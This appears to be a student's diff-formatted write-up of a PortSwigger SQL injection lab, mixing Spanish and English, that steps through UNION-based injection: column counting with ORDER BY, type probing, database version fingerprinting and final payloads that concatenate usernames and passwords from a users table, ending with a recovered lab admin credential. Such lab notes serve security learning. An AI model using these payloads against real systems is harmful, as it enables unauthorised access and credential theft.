@@ -1,0 +1,49 @@
+- Retrieving multiple values within a single column
+
+SQL injection vulnerability in the product category filter
+
+La base de datos contiene una tabla diferente llamada users, con columnas llamadas usernamey password.
+
+Para resolver la práctica de laboratorio,
+realice un ataque UNION de inyección SQL que recupere
+todos los nombres de usuario y contraseñas
+ y utilice la información para iniciar sesión como administratorusuario.
+
+ Analisys:
+ --------
+
+ 1) Determino el numero de columnas:
+' order by 1--
+' order by 2--
+' order by 3-- --> Internal Server Error
+
+3 - 1 = 2 tablas
+
+
+ 2) Determino el tipo de datos:
+
+select a,b from product where ategory=Pets'
+
+' UNION select NULL,NULL--
+' UNION select 'a',NULL-- --> Internal Server Error
+' UNION select NULL,'a'-- --> **
+
+3) Identificar el tipo de base de datos
+
+' UNION SELECT NULL,version()-- -->PostgreSQL 12.17 (Ubuntu 12.17-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+
+
+Solution:
+--------
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+
+' UNION select NULL,username||'~'||password FROM users--
+' UNION select NULL,CONCAT(username,':',password) FROM users--
+
+administrator~m8fzjbqh8euwv0e2mdgy
+
+
+
+
+
